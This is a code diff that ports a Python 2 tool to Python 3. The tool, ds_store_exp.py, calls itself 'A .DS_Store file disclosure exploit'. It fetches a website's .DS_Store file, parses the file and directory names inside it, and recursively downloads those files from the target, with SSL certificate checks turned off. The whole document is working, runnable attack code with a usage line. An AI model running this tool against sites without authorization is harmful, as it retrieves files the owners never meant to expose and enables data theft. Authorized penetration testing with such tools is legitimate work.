@@ -1,13 +1,15 @@
 #!/usr/bin/env python
 # -*- encoding: utf-8 -*-
 # LiJieJie    my[at]lijiejie.com    http://www.lijiejie.com
+# editby: microvorld
 
 import sys
-import urllib2
-import cStringIO
-import urlparse
+from urllib.parse import urlparse
+import urllib.request
+import urllib.error
+from io import BytesIO
 import os
-import Queue
+import queue
 import ssl
 import threading
 from ds_store import DSStore
@@ -17,7 +19,7 @@ context = ssl._create_unverified_context()
 
 class Scanner(object):
     def __init__(self, start_url):
-        self.queue = Queue.Queue()
+        self.queue = queue.Queue()
         self.queue.put(start_url)
         self.processed_url = set()
         self.lock = threading.Lock()
@@ -42,14 +44,14 @@ class Scanner(object):
                     self.processed_url.add(url)
                 base_url = url.rstrip('.DS_Store')
                 if not url.lower().startswith('http'):
-                    url = 'http://%s' % url
-                schema, netloc, path, _, _, _ = urlparse.urlparse(url, 'http')
+                    url = 'http://{}'.format(url)
+                schema, netloc, path, _, _, _ = urlparse(url, 'http')
                 try:
-                    response = urllib2.urlopen(url, context=context)
-                except Exception, e:
+                    response = urllib.request.urlopen(url, context=context)
+                except urllib.error.URLError as e:
                     if e.code != 404:
                         self.lock.acquire()
-                        print '[%s] %s' % (e.code, url)
+                        print('[{0}] {1}'.format(e.code, url))
                         self.lock.release()
                     continue
 
@@ -61,13 +63,14 @@ class Scanner(object):
                         os.makedirs(folder_name)
                     with open(netloc.replace(':', '_') + path, 'wb') as outFile:
                         self.lock.acquire()
-                        print '[%s] %s' % (response.code, url)
+                        print('[{0}] {1}'.format(response.code, url))
                         self.lock.release()
                         outFile.write(data)
                     if url.endswith('.DS_Store'):
-                        ds_store_file = cStringIO.StringIO()
+                        # ds_store_file = StringIO()
+                        ds_store_file = BytesIO()
                         ds_store_file.write(data)
-                        d = DSStore.open(ds_store_file)
+                        d = DSStore.open(ds_store_file,'rb')
 
                         dirs_files = set()
                         for x in d._traverse(None):
@@ -79,7 +82,7 @@ class Scanner(object):
                         d.close()
             except Exception as e:
                 self.lock.acquire()
-                print '[!] %s' % str(e)
+                print('[!] {}'.format(str(e)))
                 self.lock.release()
             finally:
                 self.working_thread -= 1
@@ -94,10 +97,10 @@ class Scanner(object):
 
 if __name__ == '__main__':
     if len(sys.argv) == 1:
-        print 'A .DS_Store file disclosure exploit.'
-        print 'It parses .DS_Store and downloads file recursively.'
-        print
-        print '    Usage: python ds_store_exp.py http://www.example.com/.DS_Store'
+        print('A .DS_Store file disclosure exploit.')
+        print('It parses .DS_Store and downloads file recursively.')
+        print()
+        print('    Usage: python ds_store_exp.py http://www.example.com/.DS_Store')
         sys.exit(0)
     s = Scanner(sys.argv[1])
     s.scan()
